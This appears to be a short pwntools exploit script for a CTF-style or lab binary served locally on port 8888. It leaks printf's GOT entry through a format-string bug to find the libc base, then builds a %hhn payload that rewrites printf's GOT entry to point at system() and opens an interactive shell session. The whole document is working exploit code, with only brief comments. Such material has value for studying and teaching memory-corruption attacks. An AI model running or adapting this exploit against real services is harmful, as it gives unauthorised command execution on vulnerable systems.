#!/usr/bin/env python

from pwn import *

# Start your service by 'ncat -vc ./vul -kl 127.0.0.1 8888'
r = remote('127.0.0.1', 8888)

printf_got = 0x804a00c

# Find these offsets by 'readelf -s /lib/i386-linux-gnu/libc.so.6'
system_off = 0x00040190
printf_off = 0x0004d280

def fmt(s):
  r.send(s + '\n')
  return r.recvrepeat(0.1)

# Calculate libc base address by leaking printf@got
base = u32(fmt(p32(printf_got) + '%5$s')[4:8]) - printf_off
system = base + system_off
print 'Libc base:', hex(base)

# Prepare %hhn format string
p = ''.join(p32(printf_got+i) for i in range(4))
printed = 16
for i in range(4):
  byte = (system >> (i*8)) & 0xff # value of byte[i]
  pad = ((byte - printed) % 256 + 256) % 256
  if pad > 0:
    p += '%%%dc' % (pad)
  p += '%%%d$hhn' % (5+i)
  printed += pad
print repr(p)

# Overwrite printf() to system()
fmt(p) 

r.interactive()
